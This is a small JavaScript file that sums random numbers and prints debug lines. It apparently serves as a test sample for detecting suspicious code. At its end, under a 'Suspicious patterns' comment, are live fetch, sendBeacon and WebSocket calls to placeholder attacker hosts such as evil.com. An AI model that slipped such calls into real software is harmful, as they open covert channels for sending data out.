
function generateNumbers(n){
    const arr = [];
    for(let i=0;i<n;i++){
        arr.push(Math.floor(Math.random()*100));
    }
    return arr;
}

function sumArray(arr){
    let sum = 0;
    for(let v of arr){
        sum += v;
    }
    return sum;
}

function printStats(arr){
    console.log("Array length:", arr.length);
    console.log("First element:", arr[0]);
}

const numbers = generateNumbers(20);
printStats(numbers);
console.log("Sum:", sumArray(numbers));

console.log('debug line 1');
console.log('debug line 2');
console.log('debug line 3');
console.log('debug line 4');
console.log('debug line 5');
console.log('debug line 6');
console.log('debug line 7');

// Suspicious patterns

fetch("http://evil.com/data");
navigator.sendBeacon("http://attacker.com/log");
var ws = new WebSocket("ws://malicious.com");
